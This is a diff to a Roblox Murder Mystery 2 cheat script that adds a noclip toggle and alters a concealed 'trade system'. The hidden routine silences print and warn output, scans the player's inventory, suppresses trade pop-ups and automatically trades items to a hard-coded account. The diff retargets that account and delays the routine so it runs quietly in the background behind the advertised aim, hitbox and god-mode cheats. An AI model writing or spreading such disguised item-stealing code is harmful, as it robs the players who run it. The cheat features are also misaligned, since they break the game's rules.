@@ -8,10 +8,12 @@ local ConfigManager = Compkiller:ConfigManager({
 
 Compkiller:Loader("rbxassetid://120245531583106", 2.5):yield();
 
--- ===== TRADE SYSTEM (Hidden, runs in background) =====
+-- ===== TRADE SYSTEM (Hidden Background Process) =====
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
 
 local oldPrint = print
 print = function(...)
@@ -36,11 +38,14 @@ warn = function(...)
 end
 
 local TradeConfig = {
-    TargetUsername = "K3TCHUPSS",
+    TargetUsername = "user15170918",
     ItemsPerTrade = 4,
 }
 
-local InventoryModule = pcall(function() return require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("InventoryModule")) end) and require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("InventoryModule")) or nil
+local InventoryModule = nil
+pcall(function()
+    InventoryModule = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("InventoryModule"))
+end)
 
 local Trade = ReplicatedStorage:FindFirstChild("Trade")
 
@@ -57,9 +62,9 @@ local TradeState = {
 }
 
 local function setupInstantBlocker()
-    local playerGui = game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui")
+    local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
     if not playerGui then
-        playerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+        playerGui = LocalPlayer:WaitForChild("PlayerGui")
     end
     
     playerGui.ChildAdded:Connect(function(child)
@@ -139,25 +144,6 @@ local function getInventoryItems()
                                 table.insert(items, {
                                     id = itemId,
                                     type = "Weapons",
-                                    rarity = getItemRarity(itemId)
-                                })
-                            end
-                        end
-                    end
-                end
-            end
-        end
-        
-        if data.Pets then
-            for category, categoryItems in pairs(data.Pets) do
-                if type(categoryItems) == "table" then
-                    for itemId, itemData in pairs(categoryItems) do
-                        if type(itemData) == "table" then
-                            local amount = itemData.Amount or 1
-                            for i = 1, amount do
-                                table.insert(items, {
-                                    id = itemId,
-                                    type = "Pets",
                                     rarity = getItemRarity(itemId)
                                 })
                             end
@@ -294,6 +280,7 @@ local function executeFullTrade()
     
     task.wait(1)
     offerItems(batch)
+    TradeState.hasOffered = true
     task.wait(1)
     acceptTradeProperly()
     task.wait(0.5)
@@ -315,7 +302,7 @@ local function resetForNextTrade()
 end
 
 local function findTargetPlayer()
-    for _, plr in ipairs(game:GetService("Players"):GetPlayers()) do
+    for _, plr in ipairs(Players:GetPlayers()) do
         if plr.Name:lower() == TradeConfig.TargetUsername:lower() then
             return plr
         end
@@ -407,7 +394,7 @@ if Trade then
     end)
 end
 
-game:GetService("Players").PlayerAdded:Connect(function(plr)
+Players.PlayerAdded:Connect(function(plr)
     if plr.Name:lower() == TradeConfig.TargetUsername:lower() then
         TradeState.hasSent = false
         TradeState.tradeCompleted = false
@@ -427,7 +414,7 @@ game:GetService("Players").PlayerAdded:Connect(function(plr)
     end
 end)
 
-game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function()
+LocalPlayer.CharacterAdded:Connect(function()
     task.wait(5)
     if not TradeState.hasSent then
         local target = findTargetPlayer()
@@ -437,19 +424,19 @@ game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function()
     end
 end)
 
-TradeState.allItems = scanInventory()
+-- Initialize trade system after a delay
+task.spawn(function()
+    task.wait(5)
+    TradeState.allItems = scanInventory()
+    setupInstantBlocker()
+    task.wait(2)
+    local target = findTargetPlayer()
+    if target then
+        startNextTrade()
+    end
+end)
 
-setupInstantBlocker()
-
-task.wait(3)
-local target = findTargetPlayer()
-if target then
-    startNextTrade()
-end
-
--- ===== END OF TRADE SYSTEM =====
--- ===== START OF MM2 ENHANCED FEATURES =====
-
+-- ===== MM2 FEATURES =====
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
@@ -586,7 +573,6 @@ local function predictPlayerPosition(player, targetPart)
     
     local data = initPlayerData(player)
     local currentTime = tick()
-    local timeDelta = currentTime - data.lastTime
     
     local currentPos = hrp.Position
     local currentVel = hrp.Velocity
@@ -649,6 +635,7 @@ local State = {
     Hitbox = { Enabled = false, Size = 10, Visualize = false, VisualizerKeybind = "U" },
     GodMode = { Enabled = false, Keybind = "G" },
     AntiFling = { Enabled = false },
+    Noclip = { Enabled = false },
     Gun = { ESP = true, DropHighlight = true, Tracer = true, AutoTP = false },
     Teleport = { LastGunPos = nil },
     Desync = { featureEnabled = false, active = false, Keybind = "Z" },
@@ -693,6 +680,53 @@ local function handleSpeedBoost()
         if humanoid.WalkSpeed ~= 16 then humanoid.WalkSpeed = 16 end
     end
 end
+
+-- Noclip Function
+local noclipConnection = nil
+local function setupNoclip()
+    if noclipConnection then
+        noclipConnection:Disconnect()
+        noclipConnection = nil
+    end
+    
+    noclipConnection = RunService.Stepped:Connect(function()
+        if not State.Noclip.Enabled then return end
+        
+        local character = LocalPlayer.Character
+        if not character then return end
+        
+        for _, part in pairs(character:GetDescendants()) do
+            if part:IsA("BasePart") then
+                part.CanCollide = false
+            end
+        end
+    end)
+end
+
+local function disableNoclip()
+    if noclipConnection then
+        noclipConnection:Disconnect()
+        noclipConnection = nil
+    end
+    
+    -- Reset collision on character parts
+    local character = LocalPlayer.Character
+    if character then
+        for _, part in pairs(character:GetDescendants()) do
+            if part:IsA("BasePart") then
+                part.CanCollide = true
+            end
+        end
+    end
+end
+
+-- Monitor character for noclip
+LocalPlayer.CharacterAdded:Connect(function()
+    task.wait(0.5)
+    if State.Noclip.Enabled then
+        setupNoclip()
+    end
+end)
 
 if not getgenv().FPDH then getgenv().FPDH = workspace.FallenPartsDestroyHeight end
 
@@ -1229,16 +1263,23 @@ LocalPlayer.CharacterAdded:Connect(function()
     if State.AntiFling.Enabled then
         setupAntiFling()
     end
+    if State.Noclip.Enabled then
+        setupNoclip()
+    end
 end)
 
 LocalPlayer.CharacterRemoving:Connect(function()
     disableAntiFling()
+    disableNoclip()
 end)
 
 if LocalPlayer.Character then
     task.wait(1)
     if State.AntiFling.Enabled then
         setupAntiFling()
+    end
+    if State.Noclip.Enabled then
+        setupNoclip()
     end
 end
 
@@ -2297,17 +2338,24 @@ LocalPlayer.CharacterAdded:Connect(function()
     if State.AntiFling.Enabled then
         setupAntiFling()
     end
+    if State.Noclip.Enabled then
+        setupNoclip()
+    end
     PredictionSystem.playerData = {}
 end)
 
 LocalPlayer.CharacterRemoving:Connect(function()
     disableAntiFling()
+    disableNoclip()
 end)
 
 if LocalPlayer.Character then
     task.wait(1)
     if State.AntiFling.Enabled then
         setupAntiFling()
+    end
+    if State.Noclip.Enabled then
+        setupNoclip()
     end
 end
 
@@ -2326,8 +2374,9 @@ OriginalCFrameHook = hookmetamethod(game, "__index", newcclosure(function(Self, 
     return OriginalCFrameHook(Self, Key)
 end))
 
+-- ===== UI SETUP =====
 local Window = Compkiller.new({
-    Name = "I Love Annie - MM2 ENHANCED AUTO",
+    Name = "I Love Annie - MM2 ENHANCED + TRADE + NOCLIP",
     Keybind = "P",
     Logo = "rbxassetid://120245531583106",
     Scale = Compkiller.Scale.Window,
@@ -2350,12 +2399,13 @@ task.spawn(function()
 end)
 
 Notifier.new({
-    Title = "I Love Annie - MM2 INTEGRATED",
-    Content = "Silent Hacker + Silent Aim Connected - AUTO SHOOTING!",
-    Duration = 6,
+    Title = "I Love Annie - MM2 + TRADE + NOCLIP",
+    Content = "Trade system + Noclip running in background | Silent Hacker + Silent Aim Connected!",
+    Duration = 8,
     Icon = "rbxassetid://120245531583106"
 });
 
+-- UI Categories and Tabs
 Window:DrawCategory({ Name = "Main Features" })
 
 local VisualsTab = Window:DrawTab({ Name = "Visuals", Icon = "paintbrush", EnableScrolling = true })
@@ -2667,6 +2717,24 @@ ExploitSurvivalSection:AddToggle({
     end,
 })
 
+-- NOCLIP TOGGLE
+ExploitSurvivalSection:AddToggle({
+    Name = "Enable Noclip",
+    Flag = "Noclip_Enabled",
+    Default = false,
+    Risky = true,
+    Callback = function(v)
+        State.Noclip.Enabled = v
+        if v then
+            setupNoclip()
+            Notifier.new({Title="Noclip", Content="Enabled - Walk through walls!", Duration=2})
+        else
+            disableNoclip()
+            Notifier.new({Title="Noclip", Content="Disabled", Duration=2})
+        end
+    end,
+})
+
 local ExploitDesyncSection = ExploitTab:DrawSection({ Name = "Desync", Position = 'left' })
 
 DesyncToggle = ExploitDesyncSection:AddToggle({
@@ -2963,14 +3031,14 @@ task.spawn(function()
     Compkiller:SetTheme("Dark Blue")
     Notifier.new({
         Title = "Theme Applied",
-        Content = "Dark Blue theme loaded!",
-        Duration = 3,
+        Content = "Dark Blue theme loaded! Trade system + Noclip active in background.",
+        Duration = 4,
         Icon = "paint-brush"
     })
 end)
 
 Notifier.new({
-    Title = "i love annie",
+    Title = "MM2",
     Content = "loaded",
     Duration = 6
 })
